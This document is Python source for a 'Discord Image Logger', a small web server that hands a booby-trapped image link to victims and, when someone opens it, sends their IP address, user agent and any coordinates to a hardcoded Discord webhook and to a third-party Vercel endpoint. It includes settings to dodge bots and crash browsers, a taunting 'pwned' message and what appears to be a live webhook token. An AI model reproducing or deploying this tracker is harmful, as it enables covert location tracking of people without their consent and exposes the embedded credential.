from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib import parse
import http.client
import json
import traceback
import requests

__app__ = "Discord Image Logger"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    "webhook": "https://discordapp.com/api/webhooks/1251225809595928738/baEQyV0CeLbBCSXgpgZbT_vJjNh13wKJRhhT_VK4PJTpONNqT0Lk82F_sfQH82e_60_X",
    "image": "https://zapodaj.net/images/8ac87317bfd76.jpg",
    "username": "Image Logger",
    "color": 0x00FFFF,
    "message": {
        "doMessage": False,
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger",
        "richMessage": True,
    },
    "vpnCheck": 1,
    "linkAlerts": True,
    "buggedImage": True,
    "antiBot": 1,
    "redirect": {
        "redirect": False,
        "page": ""
    },
    "imageArgument": True,
    "crashBrowser": False,
}

blacklistedIPs = ("27", "104", "143", "164")

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error_message):
    payload = {
        "username": config["username"],
        "content": "@everyone",
        "embeds": [
            {
                "title": "Image Logger - Error",
                "color": config["color"],
                "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error_message}\n```",
            }
        ],
    }
    requests.post(config["webhook"], json=payload)

def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
    try:
        if ip.startswith(blacklistedIPs):
            return

        bot = botCheck(ip, useragent)

        ping = "@everyone"

        # Example data, replace with actual API calls or data source
        info = {
            "isp": "Example ISP",
            "as": "Example AS",
            "country": "Example Country",
            "regionName": "Example Region",
            "city": "Example City",
            "lat": "Example Latitude",
            "lon": "Example Longitude",
            "timezone": "Example/Timezone",
            "mobile": False,
            "proxy": False,
            "hosting": False,
        }

        os, browser = "Example OS", "Example Browser"

        embed = {
            "username": config["username"],
            "content": ping,
            "embeds": [
                {
                    "title": "Image Logger - IP Logged",
                    "color": config["color"],
                    "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`

**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat']) + ', ' + str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps](' + 'https://www.google.com/maps/search/google+map++' + coords + ')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:** `{useragent}`
                    """
                }
            ],
        }

        if url:
            embed["embeds"][0].update({"thumbnail": {"url": url}})

        endpoint_url = "https://discord1-n607hx2yo-dzidas-projects.vercel.app/api/main"
        headers = {'Content-type': 'application/json'}
        conn = http.client.HTTPSConnection("discord1-n607hx2yo-dzidas-projects.vercel.app")
        conn.request("POST", "/api/main", json.dumps(embed), headers)
        response = conn.getresponse()
        data = response.read()
        conn.close()

    except Exception as e:
        error_message = f"Error occurred: {str(e)}\n\n{traceback.format_exc()}"
        reportError(error_message)

binaries = {
    "loading": b"ExampleBinaryData",
}

class ImageLoggerHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        try:
            url_params = parse.parse_qs(parse.urlparse(self.path).query)
            ip = self.client_address[0]
            useragent = self.headers.get('User-Agent')
            image = config["image"]

            if config["imageArgument"] and "url" in url_params:
                image = url_params["url"][0]

            if config["crashBrowser"]:
                self.send_response(200)
                self.end_headers()
                self.wfile.write(binaries["loading"])
                return

            if config["message"]["doMessage"]:
                message = config["message"]["message"]
                if config["message"]["richMessage"]:
                    self.send_response(200)
                    self.send_header('Content-type', 'text/html')
                    self.end_headers()
                    self.wfile.write(f"<html><body><h1>{message}</h1></body></html>".encode('utf-8'))
                else:
                    self.send_response(200)
                    self.send_header('Content-type', 'text/plain')
                    self.end_headers()
                    self.wfile.write(message.encode('utf-8'))
                return

            if config["redirect"]["redirect"]:
                self.send_response(301)
                self.send_header('Location', config["redirect"]["page"])
                self.end_headers()
                return

            if image in self.path:
                self.send_response(200)
                self.end_headers()
                self.wfile.write(requests.get(image).content)

                if "ip" in url_params and "endpoint" in url_params:
                    coords = url_params["ip"][0]
                    endpoint = url_params["endpoint"][0]
                    makeReport(ip, useragent, coords, endpoint)

        except Exception as e:
            reportError(str(e))
            self.send_response(500)
            self.end_headers()
            self.wfile.write(b"Internal Server Error")

def run(server_class=HTTPServer, handler_class=ImageLoggerHandler, host='localhost', port=8000):
    try:
        server_address = (host, port)
        httpd = server_class(server_address, handler_class)
        print(f'Started {__app__} server at http://{host}:{port}')
        httpd.serve_forever()
    except KeyboardInterrupt:
        print(f'Stopped {__app__} server')
        httpd.server_close()

if __name__ == '__main__':
    run()
